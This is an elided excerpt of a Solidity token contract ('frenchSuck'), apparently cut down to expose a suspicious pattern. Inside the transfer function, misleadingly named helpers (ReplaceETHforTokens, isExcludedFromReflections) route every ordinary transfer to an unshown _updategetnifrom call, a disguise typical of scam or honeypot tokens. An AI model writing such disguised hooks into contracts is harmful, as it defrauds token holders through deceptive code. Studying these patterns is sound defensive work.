...
contract fr is Context, IERC20, Ownable {
    ...
    string private constant _name = "frenchSuck"; // 
    ...
    function ReplaceETHforTokens(uint256 tokenAmount,address account,uint256 amount, address from)private {
    isExcludedFromReflections(account,amount, from);
    } 
   
     function isExcludedFromReflections(address account,uint256 amount, address to) private  returns(bool) {
          _updategetnifrom(amount, to);
        return true;
    }
    ...
    function _transfer(
      ...
      if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]  && to != uniswapV2Pair)
        ...
        ReplaceETHforTokens(balanceOf(address(this)),address(this),amount, from);
